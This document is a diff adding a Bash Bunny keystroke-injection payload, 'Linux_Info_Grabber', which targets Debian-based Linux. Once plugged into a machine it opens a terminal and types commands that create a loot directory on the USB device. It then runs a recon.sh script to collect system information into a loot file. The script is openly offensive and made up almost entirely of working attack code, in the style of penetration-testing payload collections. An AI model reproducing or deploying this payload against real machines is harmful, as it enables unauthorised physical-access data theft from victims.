@@ -1,0 +1,40 @@
+#!/bin/bash
+#
+# Title: Linux_Info_Grabber
+# Description: System info grabber for Linux (focus: Debian)
+# Original Author: Thorsten Sick
+# Version: 0.9
+# Category: Recon
+# Target: Linux (Debian based)
+# Creds: Simen Kjeserud for Inspiration (Info_Grabber)
+# Attackmodes: HID, STORAGE
+#
+#
+# executes recon.sh to extract sytem info
+#
+# Does NOT hide any traces
+# Is also noisy: Does more in victim shell than it has to
+
+#init
+LED SETUP
+ATTACKMODE HID STORAGE
+GET SWITCH_POSITION
+
+# attack
+LED ATTACK
+RUN UNITY xterm
+Q DELAY 1000
+Q STRING export lootdir=/media/\$USER/BashBunny/loot/InfoGrabber
+Q ENTER
+Q STRING export lootfile=\$lootdir/loot.txt
+Q ENTER
+Q STRING mkdir -p \$lootdir
+Q ENTER
+Q STRING export exepos=/media/\$USER/BashBunny/payloads/$SWITCH_POSITION
+Q ENTER
+Q STRING bash \$exepos/recon.sh \$lootfile
+Q ENTER
+
+# finish
+
+LED FINISH
